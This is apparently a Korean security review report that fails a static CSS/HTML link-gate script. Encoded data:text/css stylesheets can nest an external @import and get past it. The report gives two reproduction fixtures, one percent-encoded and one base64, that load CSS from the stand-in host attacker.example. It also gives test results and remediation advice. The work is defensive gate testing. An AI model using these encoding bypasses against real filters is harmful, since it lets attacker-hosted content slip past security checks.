# Task 13b 정적 정책 링크 게이트 재검토 — 수정 Round 3/5

검토일: 2026-07-31 (Asia/Seoul)

검토 대상:

- 구현: `a160201` (`fix(security): scan normalized CSS remote tokens`)
- 구현 보고서: `dd36b85`
- 이전 FAIL 검토: `3353673`

## 최종 판정: FAIL

이전 HTML URL 변이, `image-set`/`-webkit-image-set`, 세미콜론 없는 numeric reference는 모두 차단되도록 수정되었습니다. 그러나 percent 또는 base64로 인코딩한 `data:text/css` 안의 중첩 stylesheet가 외부 HTTPS `@import`를 수행하는 경우, broad CSS token scan은 외부 URL을 발견하지 못합니다.

## Critical

- 없음. 현재 production CSP의 `style-src 'self'`는 `data:` stylesheet를 런타임 방어선에서 제한합니다. 다만 CSP는 정적 URL allowlist의 대체물이 아니므로 아래 결함은 해소되지 않습니다.

## Important

### R3-IMP-1 — 인코딩된 `data:text/css` 중첩 import가 정적 게이트를 우회합니다

위치:

- `scripts/check-static-security.mjs:105` — `decodeCssReference`
- `scripts/check-static-security.mjs:111` — `normalizeCssForRemoteScan`
- `scripts/check-static-security.mjs:118` — `validateCssSecurity`

재현 fixture:

```css
@import url("data:text/css,%40import%20url(%22https%3A%2F%2Fattacker.example%2Fnested.css%22)%3B");
```

```css
@import url("data:text/css;base64,QGltcG9ydCB1cmwoImh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS9uZXN0ZWQuY3NzIik7");
```

기대 결과는 `site.css: unexpected remote CSS URL`과 static-security gate fail입니다. 실제 `validateCssSecurity(..., "site.css")` 결과는 두 fixture 모두 `problems: []`이었습니다.

headless Chrome 146 의미 검증에서는 percent, percent+charset, base64 `data:text/css`와 percent-encoded `data:application/css`가 모두 내부 CSS를 복호화한 뒤 `https://attacker.example/nested.css` stylesheet request를 시작했습니다. 외부 request는 interception에서 즉시 abort하여 서버 통신을 막았습니다.

원인은 현재 정규화가 CSS escape와 HTML character reference까지만 복호화하고, network-capable `data:` stylesheet payload의 percent/base64 계층은 검사하지 않기 때문입니다. 이는 모든 CSS remote reference를 fail-closed로 열거한다는 보고서의 주장과 맞지 않습니다.

## Minor

- 없음.

## 독립 재검토에서 통과한 항목

| 검사 | 결과 |
| --- | --- |
| HTML 16 URL surface × literal/entity/protocol-relative/backslash/TAB/LF/CR 7종 | 112/112 차단 |
| 정확 정책 URL의 script/link/img/form/iframe/source/video/audio/area/object/embed/base/srcset/meta refresh | 14/14 차단 |
| CSP comment와 `<area>` 오인식 | 차단 |
| 세미콜론 없는 decimal/hex numeric exact-policy reference | 차단 |
| CSS plain `url`/`@import`, image-set/webkit, escape identifier, hex/colon/slash/backslash/control, comments, 대소문자 | 차단 |
| CSS custom property, cursor, font, cross-fade 및 nested `image-set(url(...))`의 리터럴 외부 URL | 차단 |
| production policy raw anchor contract | 정확한 `href="https://huggingface.co/privacy"`와 직접 visible text만 허용 |
| `public/privacy-policy.html` | 정확 anchor 2개, URL 원문 4회, 문제 0개 |

## 실제 build와 기존 전체 검증 범위

구현 보고서 `dd36b85`의 검증 증거를 교차 확인했습니다. 추가 실험을 중단하라는 지시에 따라 아래 전체 명령은 이번 재검토 단계에서 다시 실행하지 않았으며, 구현 보고서에 기록된 기존 결과입니다.

| 기존 검증 | 기록된 결과 |
| --- | --- |
| `npm run release:static-security-check:test` | 19 tests, 0 failures |
| `npm run build` | 통과 |
| `npm run release:static-security-check` | production HTML 2개, CSS 2개, 0 problems |
| `npm run verify` | Vitest 30 files / 280 tests, policy gate 90/90, mobile doctor 18/18, 전체 gate 통과 |
| `git diff --check` | 통과 |

현재 clean production build의 PASS와 mutation gate의 완전성은 별개입니다. 위 `data:` fixture가 정적 검사기를 통과하므로 최종 보안 판정은 FAIL입니다.

## 수정 권고

`@import`가 가리키는 `data:text/css` 및 실제 stylesheet MIME 동형을 fail-closed로 거부하거나, 엄격한 크기·깊이 제한 아래 percent/base64 payload를 복호화해 중첩 CSS를 재귀 검사해야 합니다. 두 재현 fixture를 RED test로 고정하고 중첩 외부 URL이 반드시 gate fail이 된 뒤에만 PASS로 재검토할 수 있습니다.
